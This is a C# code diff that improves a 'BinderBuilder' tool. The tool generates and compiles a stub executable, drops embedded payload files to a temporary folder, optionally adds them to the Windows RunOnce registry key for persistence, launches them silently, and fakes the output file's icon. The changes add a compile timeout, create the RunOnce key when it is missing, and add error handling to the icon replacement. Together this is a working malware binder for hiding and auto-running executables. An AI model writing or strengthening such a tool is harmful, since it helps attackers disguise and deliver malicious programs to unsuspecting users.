@@ -85,13 +85,19 @@ public static class BinderBuilder
             using var proc = Process.Start(psi)!;
             var stdoutTask = proc.StandardOutput.ReadToEndAsync();
             var stderrTask = proc.StandardError.ReadToEndAsync();
-            await proc.WaitForExitAsync();
+            // 120s timeout — csc.exe should never need more than a few seconds for tiny files
+            if (!await Task.Run(() => proc.WaitForExit(120_000)))
+            {
+                try { proc.Kill(); } catch { }
+                return "Erreur : timeout csc.exe (> 120s).";
+            }
             var compileOutput = ((await stdoutTask) + "\n" + (await stderrTask)).Trim();
 
             if (proc.ExitCode != 0 || !File.Exists(outExe))
                 return $"Erreur de compilation :\n{compileOutput}";
 
-            Directory.CreateDirectory(Path.GetDirectoryName(outputPath)!);
+            var outDir = Path.GetDirectoryName(outputPath);
+            if (!string.IsNullOrEmpty(outDir)) Directory.CreateDirectory(outDir);
             File.Copy(outExe, outputPath, overwrite: true);
 
             if (!string.IsNullOrEmpty(iconSourcePath) && File.Exists(iconSourcePath))
@@ -137,7 +143,7 @@ public static class BinderBuilder
         sb.AppendLine("            string p=Path.Combine(t,name);");
         sb.AppendLine("            File.WriteAllBytes(p,b);");
         if (anyRunOnce)
-            sb.AppendLine("            if(ro)try{var k=Registry.CurrentUser.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);k?.SetValue(name,\"\\\"\" +p+ \"\\\"\");}catch{}");
+            sb.AppendLine("            if(ro)try{var k=Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);k?.SetValue(name,\"\\\"\" +p+ \"\\\"\");k?.Dispose();}catch{}");
         sb.AppendLine("            Process.Start(new ProcessStartInfo(p){UseShellExecute=true});");
         sb.AppendLine("        }catch{}");
         sb.AppendLine("    }");
@@ -215,16 +221,22 @@ public static class BinderBuilder
 
         var hUpdate = BeginUpdateResource(exePath, false);
         if (hUpdate == IntPtr.Zero) throw new InvalidOperationException("BeginUpdateResource failed.");
+        bool success = false;
         try
         {
             for (int i = 0; i < count; i++)
             {
+                if (of[i] + sz[i] > icoBytes.Length)
+                    throw new InvalidOperationException($"Icon entry {i} out of bounds.");
                 var img = new byte[sz[i]];
                 Array.Copy(icoBytes, of[i], img, 0, (int)sz[i]);
-                UpdateResource(hUpdate, RT_ICON, i + 1, LANG_NEUTRAL, img, (uint)img.Length);
+                if (!UpdateResource(hUpdate, RT_ICON, i + 1, LANG_NEUTRAL, img, (uint)img.Length))
+                    throw new InvalidOperationException($"UpdateResource RT_ICON {i} failed.");
             }
-            UpdateResource(hUpdate, RT_GROUP_ICON, 1, LANG_NEUTRAL, groupData, (uint)groupData.Length);
+            if (!UpdateResource(hUpdate, RT_GROUP_ICON, 1, LANG_NEUTRAL, groupData, (uint)groupData.Length))
+                throw new InvalidOperationException("UpdateResource RT_GROUP_ICON failed.");
+            success = true;
         }
-        finally { EndUpdateResource(hUpdate, false); }
+        finally { EndUpdateResource(hUpdate, !success); } // discard on failure
     }
 }
